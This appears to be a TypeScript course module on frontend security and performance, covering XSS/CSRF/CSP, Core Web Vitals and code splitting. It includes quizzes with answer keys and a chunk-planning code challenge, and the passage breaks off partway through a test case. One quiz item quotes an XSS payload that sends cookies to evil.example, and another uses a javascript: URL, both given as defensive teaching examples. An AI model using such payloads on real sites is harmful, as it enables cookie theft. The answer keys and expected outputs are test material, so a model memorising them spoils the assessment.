import type { Module } from "@/types/curriculum";

// Test fixtures for the chunk-planning challenge.
const SPA = {
  main: { size: 5, imports: ["node_modules/react", "App"] },
  App: {
    size: 20,
    imports: ["node_modules/react", "ui/Button"],
    dynamicImports: ["pages/Settings", "pages/Dashboard"],
  },
  "ui/Button": { size: 6, imports: ["node_modules/react"] },
  "pages/Settings": { size: 30, imports: ["utils/format", "ui/Button"] },
  "pages/Dashboard": { size: 40, imports: ["utils/format", "node_modules/chart-lib"] },
  "utils/format": { size: 8 },
  "node_modules/react": { size: 45 },
  "node_modules/chart-lib": { size: 200 },
  "legacy/unused": { size: 999, imports: ["node_modules/chart-lib"] },
};

const VENDOR_GROUP = [{ name: "vendor", test: "node_modules/" }];

export default {
  id: "fe-security-perf",
  trackId: "frontend",
  name: "Frontend Security & Performance",
  description:
    "What separates a working frontend from a production-grade one: XSS, CSRF and Content Security Policy from the browser's side, Core Web Vitals and how field data differs from lab scores, code splitting and bundle analysis, lazy loading that doesn't hurt LCP, and accessibility audits that go beyond the automated score.",
  refs: [
    { label: "OWASP: Cross Site Scripting Prevention Cheat Sheet", url: "https://cheatsheetseries.owasp.org/cheatsheets/Cross_Site_Scripting_Prevention_Cheat_Sheet.html", kind: "docs" },
    { label: "web.dev: Web Vitals", url: "https://web.dev/articles/vitals", kind: "docs" },
    { label: "web.dev: Learn Performance", url: "https://web.dev/learn/performance", kind: "docs" },
    { label: "web.dev: Learn Accessibility", url: "https://web.dev/learn/accessibility", kind: "docs" },
  ],
  topics: [
    {
      id: "feperf-xss-csrf-csp",
      moduleId: "fe-security-perf",
      trackId: "frontend",
      title: "XSS, CSRF & Content Security Policy for Frontend Engineers",
      summary:
        "Cross-site scripting is attacker-controlled data interpreted as code in your origin, where it can do anything your own JavaScript can: read the DOM and non-HttpOnly storage, call your APIs with the user's cookies, rewrite the page. React escapes text interpolation, so XSS in React apps arrives through the escape hatches: `dangerouslySetInnerHTML` with unsanitized HTML (Markdown, CMS content), URLs passed to `href` or `src`, direct DOM sinks (`innerHTML`, `insertAdjacentHTML`), `location.href = input`, and SSR state embedded in a `<script>` without escaping. React 19 replaces `javascript:` URLs in the attributes it renders with a URL that throws, but code outside React isn't covered, so sanitize HTML with DOMPurify and allow-list URL schemes.\n\nContent Security Policy is the second layer: a response header that tells the browser which scripts may run. Host allow-lists are often bypassable (JSONP endpoints, CDNs hosting old libraries), so a strict CSP uses a random per-response nonce or hashes plus `'strict-dynamic'`, which lets trusted scripts load their dependencies and makes the browser ignore host lists. Any nonce or hash also disables `'unsafe-inline'`, which survives only as a fallback for ancient browsers. Roll out with `Content-Security-Policy-Report-Only`; neither report-only nor `frame-ancestors` works from a `<meta>` tag. Trusted Types (Baseline since February 2026) lock DOM sinks to vetted values.\n\nCSRF is the reverse problem: another site makes the browser send a request that carries your cookies. `SameSite=Lax` blocks cookies on cross-site POSTs and subresource requests, but it's Chrome's default for cookies without the attribute, not every browser's, and \"site\" means registrable domain, so a compromised sibling subdomain counts as same-site. Keep a real defense for state-changing endpoints (a synchronizer or signed double-submit token, or Fetch Metadata and `Origin` checks), never mutate on GET, and remember that XSS defeats every CSRF defense.",
      level: "advanced",
      estMinutes: 70,
      isMilestone: true,
      webRefs: [
        { label: "OWASP: Cross Site Scripting Prevention Cheat Sheet", url: "https://cheatsheetseries.owasp.org/cheatsheets/Cross_Site_Scripting_Prevention_Cheat_Sheet.html", kind: "docs" },
        { label: "MDN: Content Security Policy (CSP)", url: "https://developer.mozilla.org/en-US/docs/Web/HTTP/Guides/CSP", kind: "docs" },
        { label: "web.dev: Mitigate XSS with a strict CSP", url: "https://web.dev/articles/strict-csp", kind: "article" },
        { label: "OWASP: Cross-Site Request Forgery Prevention Cheat Sheet", url: "https://cheatsheetseries.owasp.org/cheatsheets/Cross-Site_Request_Forgery_Prevention_Cheat_Sheet.html", kind: "article" },
      ],
      video: {
        title: "Cross-Site Scripting (XSS) Explained",
        channel: "PwnFunction",
        url: "https://www.youtube.com/watch?v=EoaDgUgS6QA",
        videoId: "EoaDgUgS6QA",
        durationLabel: "11:27",
      },
      alternateVideos: [
        {
          title: "Cross-Site Request Forgery (CSRF) Explained",
          channel: "PwnFunction",
          url: "https://www.youtube.com/watch?v=eWEgUcHPle0",
          videoId: "eWEgUcHPle0",
          durationLabel: "14:11",
        },
        {
          title: "Content Security Policy: From newbie to advanced - Halvor Sakshaug - NDC Security 2025",
          channel: "NDC Conferences",
          url: "https://www.youtube.com/watch?v=eFbFMqaqSAk",
          videoId: "eFbFMqaqSAk",
          durationLabel: "59:57",
        },
        {
          title: "OWASP API Security Top 10 Course – Secure Your Web Apps",
          channel: "freeCodeCamp.org",
          url: "https://www.youtube.com/watch?v=YYe0FdfdgDU",
          videoId: "YYe0FdfdgDU",
          durationLabel: "1:27:00",
          startSeconds: 3409,
          chapterLabel: "API8:2023 - Security Misconfiguration",
        },
      ],
      challengeType: "quiz",
      quiz: [
        {
          id: "feperf-xss-csrf-csp-q1",
          prompt:
            "`comment.body` is `<img src=x onerror=\"fetch('//evil.example?c='+document.cookie)\">`. What happens when React renders `<p>{comment.body}</p>`?",
          options: [
            "The markup is shown as literal text, because React escapes interpolated strings",
            "The image tag is created and the `onerror` handler runs",
            "React strips the tag and renders nothing",
            "React throws because the string contains HTML",
          ],
          correctIndex: 0,
          explanation:
            "JSX text interpolation becomes a text node, so the browser never parses it as HTML. That default is why most React XSS comes from escape hatches rather than ordinary rendering.",
          isEdgeCaseOrInterviewQuestion: true,
        },
        {
          id: "feperf-xss-csrf-csp-q2",
          prompt:
            "Users write posts in Markdown, rendered with `<div dangerouslySetInnerHTML={{ __html: marked.parse(post.body) }} />`. What's the fix?",
          options: [
            "Sanitize the generated HTML with an allow-list sanitizer such as DOMPurify before injecting it",
            "Escape the Markdown source with `encodeURIComponent` before parsing it",
            "Nothing: React 19 sanitizes `dangerouslySetInnerHTML` content automatically",
            "Nothing: Markdown can't contain HTML",
          ],
          correctIndex: 0,
          explanation:
            "Markdown allows raw HTML and links such as `javascript:` URLs, so the parser's output is untrusted HTML, and React inserts `dangerouslySetInnerHTML` as-is (hence the name). Sanitize the final HTML after Markdown rendering; encoding the source would mangle legitimate Markdown.",
        },
        {
          id: "feperf-xss-csrf-csp-q3",
          prompt:
            "A profile page renders `<a href={user.website}>Website</a>`, and a user sets their website to `javascript:alert(document.cookie)`. What's true in React 19?",
          options: [
            "React replaces the URL with one that throws when followed, but you should still allow-list `http:`/`https:`, because the same value passed to `location.href` or `window.open` isn't protected",
            "The script runs when the link is clicked, exactly as in plain HTML",
            "React refuses to render the link and throws during rendering",
            "Nothing needs to change: browsers no longer execute `javascript:` URLs",
          ],
          correctIndex: 0,
          explanation:
            "React 16.9 started warning about `javascript:` URLs and React 19 blocks them in the attributes it renders. That protection ends at React's own rendering, so validate URL schemes wherever user URLs are used.",
          isEdgeCaseOrInterviewQuestion: true,
        },
        {
          id: "feperf-xss-csrf-csp-q4",
          prompt: "`value` comes from the URL's query string. Which of these are XSS sinks? (Select all that apply.)",
          options: [
            "`element.innerHTML = value`",
            "`window.location.href = value`",
            "`<div>{value}</div>` in JSX",
            "`<div dangerouslySetInnerHTML={{ __html: value }} />`",
            "`element.textContent = value`",
          ],
          correctIndex: 0,
          correctIndices: [0, 1, 3],
          explanation:
            "HTML parsing sinks and navigation to a `javascript:` URL execute attacker input. `textContent` and JSX text interpolation always produce text nodes.",
        },
        {
          id: "feperf-xss-csrf-csp-q5",
          prompt:
            "The page is served with `Content-Security-Policy: script-src 'self' 'unsafe-inline' 'nonce-r4nd0m'`. An attacker injects `<script>alert(1)</script>` with no nonce. Does it run?",
          options: [
            "No: when a directive contains a nonce or hash, browsers ignore `'unsafe-inline'`",
            "Yes: `'unsafe-inline'` allows every inline script",
            "Yes, but only in Safari",
            "No, because `'self'` blocks all inline scripts",
          ],
          correctIndex: 0,
          explanation:
            "CSP Level 2 made nonces and hashes override `'unsafe-inline'`, so `'unsafe-inline'` in a nonce-based policy is only a fallback for browsers that predate nonces. `'self'` is about script URLs, not inline scripts.",
          isEdgeCaseOrInterviewQuestion: true,
        },
        {
          id: "feperf-xss-csrf-csp-q6",
          prompt:
            "The policy is `script-src 'nonce-R4nd0m' 'strict-dynamic' https://cdn.example.com`. Which scripts run? (Select all that apply.)",
          options: [
            "`<script nonce=\"R4nd0m\">...</script>` in the HTML",
            "A script element created with `document.createElement(\"script\")` by that nonced script",
            "`<script src=\"https://cdn.example.com/lib.js\"></script>` in the HTML without a nonce",
            "An inline `onclick=\"...\"` handler attribute",
          ],
          correctIndex: 0,
          correctIndices: [0, 1],
          explanation:
            "`'strict-dynamic'` propagates trust from nonced scripts to the scripts they load, and tells browsers to ignore host allow-lists, so the un-nonced CDN tag is blocked. Inline event handlers need `'unsafe-hashes'` and are blocked here.",
        },
        {
          id: "feperf-xss-csrf-csp-q7",
          prompt: "To save work, a team hard-codes `nonce-abc123` into its CSP header and every `<script>` tag. What's wrong?",
          options: [
            "A known nonce is no protection: injected markup can include `nonce=\"abc123\"` too. Nonces must be unpredictable and fresh per response",
            "Nonces must be base64-encoded or browsers ignore them",
            "Nonces only work together with `'unsafe-inline'`",
            "Nothing, as long as the nonce is at least 6 characters long",
          ],
          correctIndex: 0,
          explanation:
            "A nonce proves the server intended that specific script in that specific response. A static value is public after one page view; this also means HTML with nonces can't be cached and reused as-is.",
        },
        {
          id: "feperf-xss-csrf-csp-q8",
          prompt: "A static SPA with no server control adds its CSP through `<meta http-equiv=\"Content-Security-Policy\">`. Which protection can't be delivered this way?",
          options: [
            "`frame-ancestors`, which protects against clickjacking",
            "`script-src` nonces",
            "`default-src 'self'`",
            "`img-src` restrictions",
          ],
          correctIndex: 0,
          explanation:
            "`frame-ancestors` (like the report-only mode) is ignored in `<meta>` policies; framing protection needs the real response header (or `X-Frame-Options`). The fetch directives work from `<meta>`.",
        },
        {
          id: "feperf-xss-csrf-csp-q9",
          prompt:
            "Your session cookie is set without a `SameSite` attribute. A malicious page auto-submits a hidden `<form method=\"POST\" action=\"https://bank.example/transfer\">`. Why isn't the browser default enough protection?",
          options: [
            "Chrome treats unmarked cookies as `Lax`, but other browsers don't necessarily, and Chrome's default even allows POSTs for two minutes after the cookie is set",
            "Browsers never send cookies on cross-site POSTs, so the default is enough",
            "`SameSite` only applies to `fetch`, not to form submissions",
            "The browser default is `Strict`, which also breaks normal navigation",
          ],
          correctIndex: 0,
          explanation:
            "MDN notes that only some browsers default to `Lax`, and Chrome's default mode allows top-level cross-site POSTs for cookies set in the last two minutes. Set `SameSite` explicitly and keep a token or `Origin` check for state-changing requests.",
          isEdgeCaseOrInterviewQuestion: true,
        },
        {
          id: "feperf-xss-csrf-csp-q10",
          prompt:
            "The app at `app.example.com` relies on `SameSite=Lax` cookies alone. An attacker takes over the abandoned `promo.example.com`. What changes?",
          options: [
            "Requests from `promo.example.com` are same-site (same registrable domain), so the cookies are sent and SameSite provides no protection",
            "Nothing: different subdomains are always cross-site",
            "Only `SameSite=None` cookies are exposed",
            "The browser blocks the subdomain because it isn't same-origin",
          ],
          correctIndex: 0,
          explanation:
            "SameSite compares sites (scheme plus registrable domain), not origins, so sibling subdomains are trusted. That's one reason OWASP treats SameSite as defense in depth rather than the primary CSRF defense.",
        },
        {
          id: "feperf-xss-csrf-csp-q11",
          prompt: "Which statements about CSRF defenses are true? (Select all that apply.)",
          options: [
            "`GET /items/5/delete` is exploitable even with `SameSite=Lax`, because Lax cookies are sent on top-level cross-site GET navigations",
            "An attacker with XSS on your origin can read the CSRF token and forge valid requests",
            "Checking `Sec-Fetch-Site` or the `Origin` header on state-changing requests is a recognized mitigation",
            "Storing the session in `localStorage` makes CSRF and XSS both impossible",
          ],
          correctIndex: 0,
          correctIndices: [0, 1, 2],
          explanation:
            "Lax still allows top-level GET navigations, which is why mutations must never be GETs. XSS runs in your origin and defeats token-based CSRF defenses, and Fetch Metadata or Origin checks are listed by OWASP. `localStorage` tokens avoid CSRF but are readable by any XSS payload.",
        },
      ],
    },
    {
      id: "feperf-core-web-vitals",
      moduleId: "fe-security-perf",
      trackId: "frontend",
      title: "Core Web Vitals (LCP, INP, CLS) & How to Improve Them",
      summary:
        "Core Web Vitals are Google's user-centric metrics for loading, responsiveness and visual stability: Largest Contentful Paint (good at 2.5 s or less, poor above 4 s), Interaction to Next Paint (good at 200 ms or less, poor above 500 ms) and Cumulative Layout Shift (good at 0.1 or less, poor above 0.25). A page passes when the 75th percentile of real page loads, split by mobile and desktop, meets all three. INP replaced First Input Delay on 12 March 2024. FID only measured the input delay of the first interaction; INP observes every click, tap and key press (input delay, processing and presentation until the next frame) and reports the worst, ignoring one outlier per 50 interactions. Scrolling and hovering don't count.\n\nField data (CrUX, or your own RUM with the `web-vitals` library) is what users experienced and what gets assessed. Lab data (Lighthouse, DevTools) is a reproducible diagnostic on one device and network, and it can't measure INP because nobody interacts; Total Blocking Time is its proxy. That's how a 98 in Lighthouse coexists with failing field INP.\n\nLCP splits into TTFB, resource load delay, load duration and render delay. Put the LCP image in the initial HTML (not a CSS background), give it `fetchpriority=\"high\"`, never lazy-load it, and trim render-blocking CSS and JS. Poor INP means long tasks: yield to the main thread, keep handlers light, render feedback before heavy work. CLS groups shifts less than 1 s apart into session windows capped at 5 s and reports the largest window's sum. The usual culprits are images and ads without reserved space, web fonts that swap in with different metrics, and content injected above what the user is reading; shifts within 500 ms of a user input don't count, and `transform` animations don't shift layout.",
      level: "advanced",
      estMinutes: 65,
      isMilestone: true,
      webRefs: [
        { label: "web.dev: Web Vitals", url: "https://web.dev/articles/vitals", kind: "docs" },
        { label: "web.dev: Interaction to Next Paint (INP)", url: "https://web.dev/articles/inp", kind: "docs" },
        { label: "web.dev: Cumulative Layout Shift (CLS)", url: "https://web.dev/articles/cls", kind: "docs" },
        { label: "web.dev: Why lab and field data can be different", url: "https://web.dev/articles/lab-and-field-data-differences", kind: "article" },
      ],
      video: {
        title: "Web Vitals Explained",
        channel: "Syntax",
        url: "https://www.youtube.com/watch?v=KY6Cr6t-cuA",
        videoId: "KY6Cr6t-cuA",
        durationLabel: "22:33",
      },
      alternateVideos: [
        {
          title: "Optimizing INP: A deep dive",
          channel: "Chrome for Developers",
          url: "https://www.youtube.com/watch?v=cmtfM4emG5k",
          videoId: "cmtfM4emG5k",
          durationLabel: "28:29",
        },
        {
          title: "A deep dive into optimizing LCP",
          channel: "Chrome for Developers",
          url: "https://www.youtube.com/watch?v=fWoI9DXmpdk",
          videoId: "fWoI9DXmpdk",
          durationLabel: "29:15",
        },
      ],
      challengeType: "quiz",
      quiz: [
        {
          id: "feperf-core-web-vitals-q1",
          prompt:
            "On a product page, the first tap (opening the menu) responds in 40 ms. Later, applying a filter blocks the main thread for 600 ms before the list repaints. How do FID and INP rate this visit?",
          options: [
            "FID looks good because it only measured the first interaction's input delay; INP is poor because it reports the slowest interaction",
            "Both are good, because the first interaction was fast",
            "Both are poor, because both measure total blocking time",
            "FID is poor and INP is good, because INP ignores the slowest interaction",
          ],
          correctIndex: 0,
          explanation:
            "That blind spot is why INP replaced FID in March 2024: it covers input delay, processing and presentation for every interaction. INP only drops one outlier per 50 interactions, so on a typical visit the worst one counts.",
          isEdgeCaseOrInterviewQuestion: true,
        },
        {
          id: "feperf-core-web-vitals-q2",
          prompt: "Which 75th-percentile field values fall in the \"good\" range? (Select all that apply.)",
          options: ["LCP of 2.3 s", "INP of 180 ms", "CLS of 0.08", "INP of 250 ms", "LCP of 2.8 s"],
          correctIndex: 0,
          correctIndices: [0, 1, 2],
          explanation:
            "Good is LCP 2.5 s or less, INP 200 ms or less and CLS 0.1 or less. 250 ms INP and 2.8 s LCP are in \"needs improvement\" (poor starts above 500 ms and 4 s).",
        },
        {
          id: "feperf-core-web-vitals-q3",
          prompt: "Lighthouse gives the page 98, but CrUX reports a poor INP. What's the most likely explanation?",
          options: [
            "Lighthouse is lab data with no real user interactions, so it can't measure INP; real users on slower devices hit long tasks the lab run never triggered",
            "CrUX data is wrong for pages with high Lighthouse scores",
            "Lighthouse measures INP but on a faster network",
            "INP is only measured on desktop in CrUX",
          ],
          correctIndex: 0,
          explanation:
            "Lab tools report Total Blocking Time as a proxy for responsiveness. Field INP comes from real interactions on real devices, which is what the Core Web Vitals assessment uses.",
          isEdgeCaseOrInterviewQuestion: true,
        },
        {
          id: "feperf-core-web-vitals-q4",
          prompt:
            "A page load records layout shifts at 0.2 s (score 0.05), 0.9 s (0.04), 3.0 s (0.08), 3.5 s (0.03) and 9.0 s (0.02). What is its CLS?",
          options: ["0.11", "0.22", "0.08", "0.09"],
          correctIndex: 0,
          explanation:
            "Shifts less than 1 s apart form a session window: [0.2 s, 0.9 s] sums to 0.09, [3.0 s, 3.5 s] to 0.11, and 9.0 s stands alone. CLS is the largest window (0.11, \"needs improvement\"), not the lifetime total of 0.22 or the largest single shift.",
          isEdgeCaseOrInterviewQuestion: true,
        },
        {
          id: "feperf-core-web-vitals-q5",
          prompt: "Which of these count against CLS? (Select all that apply.)",
          options: [
            "An `<img>` without `width`/`height` that pushes the text down when it loads",
            "A web font that swaps in with different metrics and reflows paragraphs",
            "An ad slot injected above the article without reserved space",
            "A card animated with `transform: translateY()`",
            "Content that expands within 500 ms of the user clicking \"Show more\"",
          ],
          correctIndex: 0,
          correctIndices: [0, 1, 2],
          explanation:
            "Unexpected movement of existing content counts. Transforms don't change layout, and shifts right after a discrete user input are expected, so they're excluded. Fix fonts with metric overrides such as `size-adjust`, and reserve space for media and ads.",
        },
        {
          id: "feperf-core-web-vitals-q6",
          prompt:
            "The LCP element is a hero image set via CSS `background-image` in a stylesheet loaded by a client-rendered component. LCP is 4.2 s, mostly \"resource load delay\". What helps most?",
          options: [
            "Render it as an `<img>` in the initial HTML with `fetchpriority=\"high\"` so the preload scanner finds it immediately",
            "Add `loading=\"lazy\"` so it doesn't compete with other requests",
            "Compress the image further; the delay is download time",
            "Move the stylesheet to the end of the body",
          ],
          correctIndex: 0,
          explanation:
            "Load delay is the gap between TTFB and the moment the browser starts fetching the LCP resource. A CSS background in a late stylesheet can't be discovered until the CSS is fetched and applied; compression only shrinks load duration.",
        },
        {
          id: "feperf-core-web-vitals-q7",
          prompt:
            "Clicking \"Sort by price\" runs a 400 ms synchronous sort of 50,000 rows plus a full re-render before anything paints. Which change improves INP the most?",
          options: [
            "Paint immediate feedback, then break the work up (yield to the main thread, move the sort to a worker, virtualize the list)",
            "Debounce the click handler by 300 ms",
            "Add `will-change: transform` to the table",
            "Preload the sorting code with `modulepreload`",
          ],
          correctIndex: 0,
          explanation:
            "INP measures until the next frame is presented, so a long task in the handler delays that frame. Debouncing adds delay, and preloading code doesn't shorten the task.",
        },
        {
          id: "feperf-core-web-vitals-q8",
          prompt: "LCP is 2.9 s at p75, and the breakdown shows TTFB at 1.8 s. Where should you start?",
          options: [
            "The server and delivery path: caching, CDN, fewer redirects, faster HTML generation",
            "Converting the hero image to AVIF",
            "Adding `fetchpriority=\"high\"` to the hero image",
            "Code-splitting the JavaScript bundle",
          ],
          correctIndex: 0,
          explanation:
            "Nothing can render before the first byte arrives, so TTFB is a floor under LCP. With 1.8 s spent there, image and bundle work can win back at most the remaining 1.1 s.",
        },
        {
          id: "feperf-core-web-vitals-q9",
          prompt: "You need INP for your app's logged-in dashboard, which gets little traffic and is behind auth. Where does that data come from?",
          options: [
            "Your own real-user monitoring with the `web-vitals` library",
            "The CrUX dataset for your origin",
            "A Lighthouse run in CI",
            "PageSpeed Insights on the dashboard URL",
          ],
          correctIndex: 0,
          explanation:
            "CrUX only has data for pages with enough public Chrome traffic, and Lighthouse and PSI's lab section can't measure INP. RUM also lets you attribute slow interactions to specific elements and scripts.",
        },
        {
          id: "feperf-core-web-vitals-q10",
          prompt: "What does \"passing Core Web Vitals\" mean?",
          options: [
            "The 75th percentile of page loads meets the good threshold for LCP, INP and CLS, assessed separately for mobile and desktop",
            "The median page load meets all three thresholds",
            "The Lighthouse performance score is 90 or above",
            "Every single page load meets all three thresholds",
          ],
          correctIndex: 0,
          explanation:
            "The 75th percentile means at least three in four visits have a good experience, while tolerating outliers. Lighthouse scores are lab diagnostics and aren't part of the assessment.",
        },
      ],
    },
    {
      id: "feperf-code-splitting",
      moduleId: "fe-security-perf",
      trackId: "frontend",
      title: "Code Splitting & Bundle Size Analysis",
      summary:
        "Every byte of JavaScript costs twice: once to download, and again to parse, compile and run on the main thread, where it competes with rendering and input. A big bundle hurts LCP (render-blocking script) and INP (long tasks). Code splitting defers code the current screen doesn't need: each dynamic `import()`, including `React.lazy(() => import(...))`, becomes a separate chunk loaded on demand. Split where users cross boundaries (routes, modals, editors, charts, admin areas) rather than per component, because hundreds of tiny chunks trade one download for request overhead and waterfalls.\n\nBundlers group modules by which entry points need them. Rollup and Rolldown (Vite 8) put code reached from the same set of entries into the same chunk, so a module used only by two lazy routes lands in a shared chunk that neither the initial load nor unrelated routes pay for. Manual grouping exists mainly for caching: a rarely changing `vendor` chunk survives app deploys. In Vite 8 that's Rolldown's `codeSplitting` groups, and the object form of `manualChunks` is gone. The classic trap is the catch-all `node_modules` group: it merges a chart library used by one lazy route with React, and because the entry needs React, every visitor downloads the chart library up front. One stray static import of a lazy page does the same.\n\nMeasure before and after. `rollup-plugin-visualizer` or source-map-explorer shows what each chunk contains; look for duplicate copies of a library, CommonJS packages that defeat tree shaking, barrel files that pull in a whole library for one icon, and unused locale data. Pair lazy boundaries with prefetching (router prefetch, `modulepreload`) so the chunk is ready before the click, and handle chunk-load failures after a deploy, when old HTML requests deleted hashed files (Vite fires `vite:preloadError`), with a reload.",
      level: "advanced",
      estMinutes: 60,
      webRefs: [
        { label: "React: lazy", url: "https://react.dev/reference/react/lazy", kind: "docs" },
        { label: "web.dev: Reduce JavaScript payloads with code splitting", url: "https://web.dev/articles/reduce-javascript-payloads-with-code-splitting", kind: "article" },
        { label: "Rolldown: Manual code splitting", url: "https://rolldown.rs/in-depth/manual-code-splitting", kind: "docs" },
        { label: "web.dev: How CommonJS is making your bundles larger", url: "https://web.dev/articles/commonjs-larger-bundles", kind: "article" },
      ],
      video: {
        title: "Speed Up Your React Apps With Code Splitting",
        channel: "Web Dev Simplified",
        url: "https://www.youtube.com/watch?v=JU6sl_yyZqs",
        videoId: "JU6sl_yyZqs",
        durationLabel: "16:49",
      },
      alternateVideos: [
        {
          title: "Vite Bundle Inspection made EASY",
          channel: "Alexander Lichter",
          url: "https://www.youtube.com/watch?v=9c4HLqk1ExA",
          videoId: "9c4HLqk1ExA",
          durationLabel: "18:35",
        },
      ],
      challengeType: "code",
      codeChallenge: {
        instructions:
          "Implement `planChunks(modules, entries, groups)`, a model of how Rollup and Rolldown (Vite 8) split an app into chunks, so you can see what a code-splitting or vendor-chunk decision costs.\n\n`modules` maps each module id to `{ size, imports?, dynamicImports? }` (static `import` edges and `import()` edges), `entries` lists the initial entry modules, and `groups` holds manual chunk groups `{ name, test }`.\n\n- Entry points are the ids in `entries` plus every module that is the target of a dynamic import from a reachable module. Ignore ids that aren't in `modules` (external packages); modules that no entry point can reach aren't emitted at all.\n- An entry point's static closure is the entry point itself plus everything reachable from it through static imports only.\n- A module's `loadedBy` is the set of entry points whose static closure contains it.\n- A module whose id starts with a group's `test` goes into that group's chunk (the first matching group wins). Every other module goes into the chunk shared by all modules with exactly the same `loadedBy`: it's named after the entry point when there's only one, otherwise `shared(` + the entry points joined by `,` + `)`.\n- A chunk's `size` is the sum of its modules' sizes, and its `loadedBy` is the union of its modules' sets.\n\nReturn `{ chunks, bytes }`. `chunks` lists `{ name, modules, size, loadedBy }` sorted by `name`, with `modules` and `loadedBy` sorted (use the default string sort everywhere, including inside `shared(...)` names). `bytes[entryPoint]` is the total size of every chunk whose `loadedBy` includes that entry point: everything it needs, even chunks another entry point may already have loaded.",
        starterCode: "/**\n * @param {Record<string, { size: number, imports?: string[], dynamicImports?: string[] }>} modules\n * @param {string[]} entries\n * @param {{ name: string, test: string }[]} groups\n * @returns {{ chunks: { name: string, modules: string[], size: number, loadedBy: string[] }[], bytes: Record<string, number> }}\n */\nfunction planChunks(modules, entries, groups) {\n  // Your code here\n  return { chunks: [], bytes: {} };\n}\n",
        functionName: "planChunks",
        testCases: [
          {
            description: "lazy routes get their own chunks, and code shared only by them gets a shared chunk",
            args: [SPA, ["main"], []],
            expected: {
              chunks: [
                { name: "main", modules: ["App", "main"], size: 25, loadedBy: ["main"] },
                {
                  name: "pages/Dashboard",
                  modules: ["node_modules/chart-lib", "pages/Dashboard"],
                  size: 240,
                  loadedBy: ["pages/Dashboard"],
                },
                {
                  name: "pages/Settings",
                  modules: ["pages/Settings"],
                  size: 30,
                  loadedBy: ["pages/Settings"],
                },
                {
                  name: "shared(main,pages/Settings)",
                  modules: ["node_modules/react", "ui/Button"],
                  size: 51,
                  loadedBy: ["main", "pages/Settings"],
                },
                {
                  name: "shared(pages/Dashboard,pages/Settings)",
                  modules: ["utils/format"],
                  size: 8,
                  loadedBy: ["pages/Dashboard", "pages/Settings"],
                },
              ],
              bytes: { main: 76, "pages/Settings": 89, "pages/Dashboard": 248 },
            },
          },
          {
            description: "a catch-all vendor group drags a route-only library into the initial load",
            args: [SPA, ["main"], VENDOR_GROUP],
            expected: {
              chunks: [
                { name: "main", modules: ["App", "main"], size: 25, loadedBy: ["main"] },
                {
                  name: "pages/Dashboard",
                  modules: ["pages/Dashboard"],
                  size: 40,
                  loadedBy: ["pages/Dashboard"],
                },
                {
                  name: "pages/Settings",
                  modules: ["pages/Settings"],
                  size: 30,
                  loadedBy: ["pages/Settings"],
                },
                {
                  name: "shared(main,pages/Settings)",
                  modules: ["ui/Button"],
                  size: 6,
                  loadedBy: ["main", "pages/Settings"],
                },
                {
                  name: "shared(pages/Dashboard,pages/Settings)",
                  modules: ["utils/format"],
                  size: 8,
                  loadedBy: ["pages/Dashboard", "pages/Settings"],
                },
                {
                  name: "vendor",
                  modules: ["node_modules/chart-lib", "node_modules/react"],
                  size: 245,
                  loadedBy: ["main", "pages/Dashboard", "pages/Settings"],
                },
              ],
              bytes: { main: 276, "pages/Settings": 289, "pages/Dashboard": 293 },
            },
          },
          {
            description: "a vendor group that only captures React keeps the chart library lazy",
            args: [SPA, ["main"], [{ name: "react-vendor", test: "node_modules/react" }]],
            expected: {
              chunks: [
                { name: "main", modules: ["App", "main"], size: 25, loadedBy: ["main"] },
                {
                  name: "pages/Dashboard",
                  modules: ["node_modules/chart-lib", "pages/Dashboard"],
                  size: 240,
                  loadedBy: ["pages/Dashboard"],
                },
                {
                  name: "pages/Settings",
                  modules: ["pages/Settings"],
                  size: 30,
                  loadedBy: ["pages/Settings"],
                },
                {
                  name: "react-vendor",
                  modules: ["node_modules/react"],
                  size: 45,
                  loadedBy: ["main", "pages/Settings"],
                },
                {
                  name: "shared(main,pages/Settings)",
                  modules: ["ui/Button"],
                  size: 6,
                  loadedBy: ["main", "pages/Settings"],
                },
                {
                  name: "shared(pages/Dashboard,pages/Settings)",
                  modules: ["utils/format"],
                  size: 8,
                  loadedBy: ["pages/Dashboard", "pages/Settings"],
                },
              ],
              bytes: { main: 76, "pages/Settings": 89, "pages/Dashboard": 248 },
            },
          },
          {
            description: "a stray static import of a lazy page pulls it (and its dependencies) into the entry",
            args: [
              {
                main: { size: 5, imports: ["node_modules/react", "App", "pages/Dashboard"] },
                App: {
                  size: 20,
                  imports: ["node_modules/react", "ui/Button"],
                  dynamicImports: ["pages/Settings", "pages/Dashboard"],
                },
                "ui/Button": { size: 6, imports: ["node_modules/react"] },
                "pages/Settings": { size: 30, imports: ["utils/format", "ui/Button"] },
                "pages/Dashboard": { size: 40, imports: ["utils/format", "node_modules/chart-lib"] },
                "utils/format": { size: 8 },
                "node_modules/react": { size: 45 },
                "node_modules/chart-lib": { size: 200 },
                "legacy/unused": { size: 999, imports: ["node_modules/chart-lib"] },
              },
              ["main"],
              [],
            ],
            expected: {
              chunks: [
                { name: "main", modules: ["App", "main"], size: 25, loadedBy: ["main"] },
                {
                  name: "pages/Settings",
                  modules: ["pages/Settings"],
                  size: 30,
                  loadedBy: ["pages/Settings"],
                },
                {
                  name: "shared(main,pages/Dashboard)",
                  modules: ["node_modules/chart-lib", "pages/Dashboard"],
                  size: 240,
                  loadedBy: ["main", "pages/Dashboard"],
                },
                {
                  name: "shared(main,pages/Dashboard,pages/Settings)",
                  modules: ["utils/format"],
                  size: 8,
                  loadedBy: ["main", "pages/Dashboard", "pages/Settings"],
                },
                {
                  name: "shared(main,pages/Settings)",
                  modules: ["node_modules/react", "ui/Button"],
                  size: 51,
                  loadedBy: ["main", "pages/Settings"],
                },
              ],
              bytes: { main: 324, "pages/Settings": 89, "pages/Dashboard": 248 },
            },
          },
          {
            description: "two page entries of a multi-page app share a common chunk",
            args: [
              {
                "pages/home": { size: 10, imports: ["lib/analytics", "lib/dom"] },
                "pages/admin": { size: 25, imports: ["lib/analytics", "lib/table"] },
                "lib/analytics": { size: 12 },
                "lib/dom": { size: 4 },
                "lib/table": { size: 30, imports: ["lib/dom"] },
              },
              ["pages/home", "pages/admin"],
              [],
            ],
            expected: {
              chunks: [
                {
                  name: "pages/admin",
                  modules: ["lib/table", "pages/admin"],
                  size: 55,
                  loadedBy: ["pages/admin"],
                },
                { name: "pages/home", modules: ["pages/home"], size: 10, loadedBy: ["pages/home"] },
                {
                  name: "shared(pages/admin,pages/home)",
                  modules: ["lib/analytics", "lib/dom"],
                  size: 16,
                  loadedBy: ["pages/admin", "pages/home"],
                },
              ],
              bytes: { "pages/home": 26, "pages/admin": 71 },
            },
          },
          {
            description: "static import cycles are fine: each module is assigned once",
            args: [
              {
                a: { size: 1, imports: ["b"] },
                b: { size: 2, imports: ["c"] },
